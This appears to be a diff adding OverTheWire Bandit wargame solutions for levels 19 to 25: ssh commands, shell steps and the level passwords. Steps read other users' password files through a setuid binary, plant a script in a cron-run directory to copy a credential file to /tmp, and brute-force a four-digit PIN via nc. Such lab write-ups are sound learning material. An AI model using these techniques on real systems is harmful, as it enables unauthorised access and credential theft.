@@ -386,5 +386,95 @@ cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
 
 ssh  bandit20@bandit.labs.overthewire.org -p 2220
 
+ls -l
+./bandit20-do
+./bandit20-do cat /etc/bandit_pass/bandit20
 
+> password
 
+```bash
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
+```
+
+## Level 20-21
+
+> commands
+
+ssh  bandit21@bandit.labs.overthewire.org -p 2220
+echo -n '0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO' | nc -l -p 1234 &
+./suconnect 1234
+
+> password
+
+```bash
+EeoULMCra2q0dSkYj561DX7s1CpBuOBt
+```
+
+## Level 21-22
+
+> commands
+
+ssh  bandit22@bandit.labs.overthewire.org -p 2220
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit22
+cat /usr/bin/cronjob_bandit22.sh
+cat /tmp/some_random_filename
+
+> password
+
+```bash
+tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
+```
+
+## Level 22-23
+
+> commands
+
+ssh  bandit23@bandit.labs.overthewire.org -p 2220
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit23
+cat /usr/bin/cronjob_bandit23.sh
+echo I am user bandit23 | md5sum
+cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+
+> password
+
+```bash
+0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
+```
+
+## Level 23-24
+
+> commands
+
+ssh  bandit24@bandit.labs.overthewire.org -p 2220
+cd /etc/cron.d/
+ls -l
+cat cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+cd /var/spool/bandit24/foo/
+echo '#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bandit23_pw.txt' > myscript.sh
+chmod +x myscript.sh
+cat /tmp/bandit23_pw.txt
+
+> password
+
+```bash
+gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+```
+
+## Level 24-25
+
+> commands
+
+ssh  bandit25@bandit.labs.overthewire.org -p 2220
+for i in $(seq -w 0000 9999); do
+    echo "$(cat /etc/bandit_pass/bandit24) $i"
+done | nc localhost 30002
+
+> password
+
+```bash
+iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+```
